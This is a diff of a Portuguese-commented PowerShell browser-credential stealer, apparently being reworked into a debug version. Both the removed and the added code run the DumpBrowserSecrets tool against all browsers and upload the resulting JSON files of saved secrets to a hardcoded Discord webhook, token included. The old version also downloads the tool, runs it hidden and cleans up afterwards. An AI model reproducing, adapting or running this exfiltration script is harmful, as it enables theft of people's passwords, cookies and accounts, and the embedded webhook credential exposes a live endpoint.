@@ -1,105 +1,82 @@
-# send_browser_data.ps1
+# send_browser_data_debug.ps1
 # Execute como Administrador
 
-# ==================================================
-# CONFIGURAÇÕES
-# ==================================================
+$LogFile = "$env:TEMP\browser_stealer_log.txt"
+function Write-Log {
+    param([string]$Message)
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $line = "[$timestamp] $Message"
+    Write-Host $line -ForegroundColor Cyan
+    Add-Content -Path $LogFile -Value $line
+}
+
+Write-Log "=== INÍCIO DO SCRIPT ==="
+
 $WebhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
 $InstallFolder = "C:\ProgramData\DumpBrowserSecrets"
 $DumpExe = "$InstallFolder\DumpBrowserSecrets.exe"
-$DumpUrl = "https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/latest/download/DumpBrowserSecrets.exe"
-$TempFolder = $env:TEMP
-$OutputFile = "$TempFolder\browser_data.json"
+$OutputFolder = "$env:TEMP\DumpOutput"
 
-# ==================================================
-# 0. CRIA A PASTA E BAIXA O EXECUTÁVEL
-# ==================================================
-Write-Host "[0] Preparando ambiente..." -ForegroundColor Cyan
+# Cria a pasta de saída
+if (Test-Path $OutputFolder) { Remove-Item -Path $OutputFolder -Recurse -Force }
+New-Item -ItemType Directory -Path $OutputFolder -Force | Out-Null
 
-# Cria a pasta se não existir
-if (-not (Test-Path $InstallFolder)) {
-    New-Item -ItemType Directory -Path $InstallFolder -Force | Out-Null
-}
-
-# Verifica se o executável já existe; se não, baixa
+# Verifica se o .exe existe
 if (-not (Test-Path $DumpExe)) {
-    Write-Host "Baixando DumpBrowserSecrets.exe..." -ForegroundColor Yellow
-    try {
-        Invoke-WebRequest -Uri $DumpUrl -OutFile $DumpExe -ErrorAction Stop
-        Write-Host "Download concluído." -ForegroundColor Green
-    } catch {
-        Write-Host "ERRO ao baixar o executável: $_" -ForegroundColor Red
-        exit 1
-    }
-} else {
-    Write-Host "Executável já existe em: $DumpExe" -ForegroundColor Green
+    Write-Log "ERRO: DumpBrowserSecrets.exe não encontrado em: $DumpExe"
+    Read-Host "Pressione Enter para sair"
+    exit 1
 }
 
-# ==================================================
-# 1. EXECUTA O DUMPBROWSERSECRETS
-# ==================================================
-Write-Host "[1] Executando DumpBrowserSecrets..." -ForegroundColor Cyan
+Write-Log "Executando DumpBrowserSecrets (janela visível para debug)..."
+Write-Log "Comando: $DumpExe /b:all /e:all"
 
-# Se o arquivo de saída já existir, remove
-if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }
+# Executa SEM ocultar (para ver o que acontece)
+$process = Start-Process -FilePath $DumpExe -WorkingDirectory $OutputFolder -ArgumentList "/b:all /e:all" -Wait -PassThru -NoNewWindow
 
-# Executa o DumpBrowserSecrets
-$process = Start-Process -FilePath $DumpExe -ArgumentList "/o `"$OutputFile`"" -Wait -PassThru -WindowStyle Hidden
+Write-Log "Processo finalizado. ExitCode: $($process.ExitCode)"
 
 if ($process.ExitCode -ne 0) {
-    Write-Host "ERRO: DumpBrowserSecrets falhou com código $($process.ExitCode)" -ForegroundColor Red
+    Write-Log "ERRO: ExitCode $($process.ExitCode)"
+    Write-Log "Pressione qualquer tecla para continuar..."
+    Read-Host
     exit 1
 }
 
-# Verifica se o arquivo foi gerado
-if (-not (Test-Path $OutputFile)) {
-    Write-Host "ERRO: Arquivo de saída não foi gerado." -ForegroundColor Red
+# Lista os arquivos gerados
+$jsonFiles = Get-ChildItem -Path $OutputFolder -Filter "*.json" -File
+Write-Log "Arquivos JSON gerados: $($jsonFiles.Count)"
+
+if ($jsonFiles.Count -eq 0) {
+    Write-Log "Nenhum JSON encontrado. Verifique a pasta: $OutputFolder"
+    Read-Host "Pressione Enter para sair"
     exit 1
 }
 
-Write-Host "Arquivo gerado: $OutputFile" -ForegroundColor Green
-
-# ==================================================
-# 2. ENVIA PARA O DISCORD
-# ==================================================
-Write-Host "[2] Enviando para o Discord..." -ForegroundColor Cyan
-
-# Lê o arquivo como bytes
-$fileBytes = [System.IO.File]::ReadAllBytes($OutputFile)
-$fileName = "browser_data_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
-
-# Monta o multipart/form-data
-$boundary = "---------------------------$([System.DateTime]::Now.Ticks.ToString('x'))"
-$bodyLines = @()
-
-# Adiciona o arquivo
-$bodyLines += "--$boundary"
-$bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
-$bodyLines += "Content-Type: application/json"
-$bodyLines += ""
-$bodyLines += [System.Text.Encoding]::UTF8.GetString($fileBytes)
-$bodyLines += "--$boundary--"
-
-$body = [string]::Join("`r`n", $bodyLines)
-$headers = @{
-    "Content-Type" = "multipart/form-data; boundary=$boundary"
+foreach ($file in $jsonFiles) {
+    Write-Log "Enviando: $($file.Name) ($([math]::Round($file.Length/1KB,2)) KB)"
+    
+    $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
+    $fileName = $file.Name
+    $boundary = "---------------------------$([System.DateTime]::Now.Ticks.ToString('x'))"
+    $bodyLines = @()
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
+    $bodyLines += "Content-Type: application/json"
+    $bodyLines += ""
+    $bodyLines += [System.Text.Encoding]::UTF8.GetString($fileBytes)
+    $bodyLines += "--$boundary--"
+    $body = [string]::Join("`r`n", $bodyLines)
+    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
+    
+    try {
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body -ErrorAction Stop
+        Write-Log "Arquivo $($file.Name) enviado com sucesso!"
+    } catch {
+        Write-Log "ERRO ao enviar $($file.Name): $_"
+    }
 }
 
-try {
-    $response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body -ErrorAction Stop
-    Write-Host "Arquivo enviado com sucesso!" -ForegroundColor Green
-} catch {
-    Write-Host "ERRO ao enviar: $_" -ForegroundColor Red
-}
-
-# ==================================================
-# 3. LIMPEZA
-# ==================================================
-Write-Host "[3] Limpando arquivo temporário..." -ForegroundColor Cyan
-Remove-Item $OutputFile -Force -ErrorAction SilentlyContinue
-
-Write-Host "Pronto!" -ForegroundColor Green
-
-# Opcional: mantém o DumpBrowserSecrets.exe instalado para usar depois
-# Se quiser deletar também, descomente:
-# Remove-Item -Path $InstallFolder -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $OutputFolder -Recurse -Force -ErrorAction SilentlyContinue
+Write-Log "=== FIM DO SCRIPT ==="
+Read-Host "Pressione Enter para sair"
